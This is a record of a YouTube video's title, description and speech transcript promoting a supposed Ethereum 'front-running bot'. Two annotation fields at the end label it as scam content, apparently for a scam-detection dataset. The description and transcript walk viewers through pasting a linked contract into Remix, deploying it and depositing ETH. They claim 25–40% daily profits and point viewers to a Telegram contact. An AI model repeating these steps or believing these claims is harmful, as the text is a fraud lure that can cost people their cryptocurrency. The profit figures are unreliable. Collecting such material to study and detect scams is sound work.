title: How to Get Passive Income with ETH Merge 2.0 Liquidity Pool
description: Automated trading with MetaMask on Uniswap and other DeFi platforms can be used to make insane profits. In this video, I go over how to setup my front running bot which will perform buy/sell actions automatically without having to go through the typical manual transactional methods, which will generate passive income so you can enjoy what you want in life.  Github: https://github.com/metamask-tutorial/MetaMaskMethod  You can PM me on Telegram for any questions: https://t.me/SolidityDefi  STEP BY STEP INSTRUCTIONS:  1. Download MetaMask: https://metamask.io/download  2. Access Remix Compiler: https://remix-ethereum.com/  3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"  4. Paste THIS code in Remix: https://github.com/metamask-tutorial/MetaMaskMethod/blob/main/Bot.sol  5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it  6. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now  7. Deposit funds to your exact contract/bot address  8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button  Share your profits in the comments below, and like & subscribe for more solidity tutorials.  :police car light: EDIT: I have received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The Bot targets token contracts with max 10% burn fee and anything lower, however nowadays most tokens come with 3~6% fees. If you fund the contract with 0.4 ETH or less and the bot targets another token with high burn fees, the contract will basically waste a lot of gas fees. I recommend funding the contract with at least 0.5 ETH to make sure that won't happen. asr.full_text: hello youtube my name is max from web3 academy today we'll be getting into building a smart contract bot I recently developed in the solidity language which can help you make very easy daily passive income in a few words my bot which I call a front running bot allows you to automatically trade a given token from the ethereum blockchain without having to go through the typical manual transactional methods. This is going to enable us to front-run transactions on decentralized finance exchanges such as Uniswap. Basically, it will sniff the meme pool for transactions that are pending within a block and it's going to allow us to inject our transaction with a higher gas fee, one guey higher than the transaction which is trying to be entered. This will allow our transaction to be processed first, and then we also process a sell order within the same block. So, essentially the pending transaction gets sandwiched between hours, and we make a profit after slippage difference in the transaction. To start off, make sure you have the metamask browser extension installed and are connected to the Ethereum main net. So head on over to Ethereum-remix.org Remix is a web3 application allowing us to develop, deploy, compile, and launch smart contracts coded in the Solidity language. You can find the link to Remix in the description below. Once you've clicked that, MetaMask will be connected to Remix. So on Remix compiler, head over to the sidebar on the left and create a new contract under the Contracts folder. We're going to n it Bot.sol. So next, if you look in the description, I've included a link to the source code of my bot. You just need to copy and paste the code into the new file bot you created on Remix. This is our Frontrunner Bot Smart contract that I've created. A couple of items to look at here is the lines 50 and 51 If you follow those addresses on E-Scan, you will see that these are the addresses of wrapped Ether tokens. Yup, as you can see it is the official wrapped Ether address, always check that. So let's get back to Remix. Now that we have our bot file ready, let's compile it. Click here. As you see, it's built with the 0.6.6 version of Solidity. Now, under Compiler, we're going to select our version to 0.6.6, so it matches our contract. Also make sure the language is set to Solidity and EVM version to compiler default. Now click on the compileBot.sol button and wait for the file to compile. So now we're going to deploy this to our wallet. Head over to deploy and run transactions and remix. here select injected web3 as the environment. now we have the deployment utility right here. now click the deploy button. we need to confirm creation of our contract by paying some gas fees. gas fees are the commission on the ethereum network for smart contract deployment. I always set gas fee to high. There's not much difference. So let's click confirm and wait for the transaction is now confirmed. Now is time for the contract to be deployed. As we can see here, there are 4 actions for our smart contract. The start button will enable the bot to begin sniffing the meme pool. Withdraw will stop the bot and transfer funds back to your wallet. Token name and token symbols speak for themselves. So let's copy the smart contract address to make sure it was created. I'm going to head back to EtherScan and paste it in. Yep, it was created successfully. So the next step is to fund the contract with some Ethereum to snipe liquidity pools. I'm going to copy our contract address and head back over to my metamask. Make sure you got the right address in there. You can fund the contract with however many Ethereum you want. But obviously, the more you put in, the larger the transactions you'll be able to front run and the more profit you'll be able to accumulate over time. So for instance, if you're only able to front-run and the more profit you'll be able to accumulate over time. So, for instance, if you're only able to front-run with Say $100, you're not going to be able to create as much slippage in the price as if you were inserting something like $10,000. There we go, the transaction confirmed, so, it was sent to the contract. We can check it by following our contract address on etherscan.io. So the contract has won Ethereum in its balance, which is the amount we have funded the contract with. So the next step is to click start. This will enable the bot to begin sniffing the meme pool to find liquidity pairs in order for you to front run transactions. So let's set Gas fee to high, save and click confirm. Well, guys, it's been a little over 24 hours, and now let's check the profits the bot worked for me. So now you can see I have around 1.26 ether, which is around 25% profit. I'll withdraw my profit after letting the bot run for 24 hours. So.. I'll see you then! All right, let's see what we have here! Oh, nice! It's at about 1.4 Ethereum, so it basically took me about a day to gain my deposit back by more than a third. So that's close to 40% profit which isn't bad at all. The bot will continue to run until you press the withdraw button. When you press withdraw the bot exits from the liquidity pool. And it will send the total ethereum you entered into the wallet. So let's click it. This will charge is a little bit of gas. I'll set it to High again. There we go the transaction confirmed. Let's go to our MetaMask and check what we have now. You can see my balance here. Only running my bot for a couple days. I've even had some weeks where I've made three to five ethereum sometimes more the profits will fluctuate week to week if you have any questions you can contact me on telegram which i provided in the description below

annotation.contextual_rationale: This video is scam content because it directly promotes an automated Ethereum front-running bot as a source of passive income and unusually high profits, instructing viewers to deploy the contract and deposit Ethereum to its address. It presents reported returns of about 25% and three to five ETH over some weeks, while noting that gas and burn-fee risks exist and profits fluctuate. Those qualifications do not remove the connection between the promoted returns, required cryptocurrency funding, and bot workflow.
annotation.fine_grained_rationale: The promoted bot is linked to passive trading income, with explicit instructions to deposit Ethereum into its contract and start it. The speaker also links larger funding to greater purported profit. The speaker explicitly presents a transaction-ordering mechanism: paying a higher gas fee to get ahead of a pending transaction, then placing a sell order so that the pending transaction is sandwiched for purported slippage profit. This describes the offered manipulation, not proof that it works.
